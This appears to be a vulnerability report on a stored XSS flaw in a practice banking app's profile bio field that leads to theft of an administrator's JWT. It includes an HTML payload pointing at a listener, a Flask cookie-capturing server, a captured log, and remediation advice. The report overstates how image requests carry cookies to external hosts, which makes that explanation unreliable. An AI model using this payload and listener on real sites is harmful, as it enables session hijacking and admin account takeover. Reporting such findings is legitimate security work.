# Stored XSS via Bio Field Leading to Admin JWT Theft

* **Vulnerability Type:** CWE-79 — Cross-Site Scripting (Stored XSS)
* **Impact Category:** Session Theft / Privilege Escalation
* **Target / Platform:** `vulnbank.org`
* **Severity / CVSS:** Critical
* **Affected Endpoint:** Bio update field in the profile settings page

---

## 📌 Summary

The application allows HTML input inside the user bio field without proper sanitization or output encoding. This enables an attacker to store a malicious HTML payload that is executed whenever another user views the profile or bio.

In the tested scenario, the payload forced the victim's browser to make a background request to an attacker-controlled listener. Because the victim was an administrator, the request included the administrator's authentication token in the `Cookie` header, resulting in session theft.

---

## 📝 Description

The profile bio feature accepts raw HTML content and renders it directly in the application. Since the input is neither sanitized nor safely encoded before display, a stored XSS condition exists.

By placing a malicious `<img>` tag in the bio field, an attacker can trigger a browser-side request to an external server under their control. When an administrator later views the attacker’s bio, the browser automatically loads the external resource and sends the administrator’s session cookie along with the request. This exposes the victim’s JWT and allows the attacker to impersonate the administrator.

---

## 🎯 Impact

A successful attacker can steal a valid administrator session token and gain unauthorized access to the platform.

Potential consequences include:

* Administrator session hijacking
* Full privilege escalation to admin
* Unauthorized access to sensitive data
* Unauthorized administrative actions
* Account takeover of high-privilege users

Because the token belongs to an authenticated admin session, the attacker can reuse it to act as the victim without knowing the password.

---

## 🛠️ Proof of Concept

### Attack Scenario

1. Log in to the application using a regular attacker account.
2. Navigate to the profile settings page.
3. Locate the **Update your bio** input field.
4. Inject a malicious HTML payload such as:

```html id="b1o1p0"
<img src="http://127.0.0.1:5050" />
```

5. Save the bio.
6. Start a local Flask listener on port `5050` to capture incoming requests.
7. Trigger the victim flow by having the administrator view the attacker’s public profile or bio.
8. Observe that the administrator’s browser sends a request to the attacker-controlled server.
9. Confirm that the `token` cookie contains the administrator JWT.

---

### Attacker Listener

The attacker-controlled listener used for verification:

```python id="fl4sk5"
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def home():
    print("=" * 50)
    print("Headers:")
    print(request.headers)
    print("\nCookies:")
    print(request.cookies)
    return "OK"

app.run(host="0.0.0.0", port=5050)
```

---

### Captured Attack Log

```text id="l0g505"
==================================================
Headers:
Host: 127.0.0.1:5050
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1
Cookie: token=<stolen_admin_jwt>
Connection: keep-alive

Cookies:
ImmutableMultiDict([('token', '<stolen_admin_jwt>')])
Body: b''
127.0.0.1 - - [05/Aug/2026 08:15:38] "GET / HTTP/1.1" 200 -
```

---

### Decoded JWT Payload

After decoding the captured token, the payload confirms that the victim is an administrator:

```json id="jwtp4y"
{
  "user_id": 6,
  "username": "admin",
  "is_admin": true,
  "iat": 1785892527
}
```

---

## 🔍 Root Cause

The application renders user-supplied bio content as HTML without proper sanitization or output encoding. Because of this, attacker-controlled markup is executed in the victim's browser.

The vulnerability becomes critical because the application also exposes the victim's session token to browser requests, allowing the attacker to capture it through an external endpoint.

---

## ✅ Evidence

* The bio field accepts raw HTML input.
* The injected `<img>` tag triggers a request to the attacker-controlled listener.
* The administrator’s browser sends the request automatically when viewing the malicious bio.
* The request contains the `token` cookie.
* The decoded token shows `is_admin: true`.

---

## 📊 Attack Flow

```text id="xssfl1"
Attacker logs in
      │
      ▼
Injects malicious HTML into bio
      │
      ▼
Bio is stored without sanitization
      │
      ▼
Administrator views the bio
      │
      ▼
Browser loads attacker-controlled resource
      │
      ▼
Admin JWT is sent in the Cookie header
      │
      ▼
Attacker captures the token and impersonates admin
```

---

## 🛡️ Remediation

* Sanitize all user-generated HTML before storing or rendering it.
* Apply strict output encoding when displaying user content.
* Use an allowlist-based HTML sanitizer if HTML support is required.
* Avoid rendering raw HTML from untrusted users.
* Set session cookies with `HttpOnly`, `Secure`, and `SameSite` attributes where appropriate.
* Add a Content Security Policy (CSP) to reduce the impact of XSS.

---

## 📚 References

* CWE-79 — Cross-Site Scripting
* OWASP Top 10 — Injection
* OWASP XSS Prevention Cheat Sheet

---

## 📝 Notes

This finding is a stored XSS issue with direct session theft impact. The most important evidence is not the HTML payload itself, but the fact that the administrator’s browser automatically sends the authenticated session token to an attacker-controlled server.
